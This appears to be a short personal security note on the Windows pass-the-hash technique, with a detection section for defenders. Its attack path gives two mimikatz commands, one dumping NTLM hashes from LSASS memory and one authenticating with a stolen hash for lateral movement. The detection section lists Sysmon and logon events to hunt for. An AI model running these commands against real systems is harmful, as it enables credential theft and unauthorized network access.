### General Notes

Tis is an attack where attackers can use the [[NTLM]] password hash instead of the actual plain text password to authenticate.

---
### Attack Path

Using `mimikatz` on a machine to extract the NTLM hash of a user that is logged into the current system.
- This requires admin rights.
```
mimikatz # sekurlsa::logonpasswords
```

Running the `pth`, pass the hash, argument with the obtain credentials and the domain:
```
mimikatz # sekurlsa::pth /user:<username> /ntlm:<hash> /domain:<domain>
```

> The attacker now has an authenticated session as the `username`, and can move laterally within the network and gain unauthorized access to systems and resources.

---
### Detection

Mimikatz accesses the `LSASS` process memory, check out [[Windows Processes#`lsass.exe`|lsass.exe]], and changes the `LogonSession` information in the access token.
- This is a process access event and can be identified using [[Sysmon]] event ID 10.
- Need to look for login events `4624` with *logon_type* `9`, which is for `NewCredentials`. 

We also need to hunt for `Logon_Process = seclogo`.
- This is the logon pipeline used when windows creates a network only credential token, which is the behavior observed during pass the hash attacks.